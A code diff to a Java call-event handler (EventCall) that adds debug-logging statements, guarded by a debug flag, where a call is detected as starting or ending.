@@ -111,6 +111,11 @@ public class EventCall extends BaseEvent implements Observer<Call> {
 			// Match any number
 			if (number.length() == 0) {
 				inCall = true;
+				
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (notification): triggering inCall"); //$NON-NLS-1$
+				}
+				
 				onEnter();
 
 				return 0;
@@ -119,6 +124,11 @@ public class EventCall extends BaseEvent implements Observer<Call> {
 			// Match a specific number
 			if (c.getNumber().contains(number)) {
 				inCall = true;
+				
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (notification): triggering inCall"); //$NON-NLS-1$
+				}
+				
 				onEnter();
 
 				return 0;
@@ -135,6 +145,10 @@ public class EventCall extends BaseEvent implements Observer<Call> {
 		    recorder.release();
 		    recorder = null;*/
 			// FINE TEST
+			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (notification): triggering endCall"); //$NON-NLS-1$
+			}
 			
 			onExit();
 			return 0;
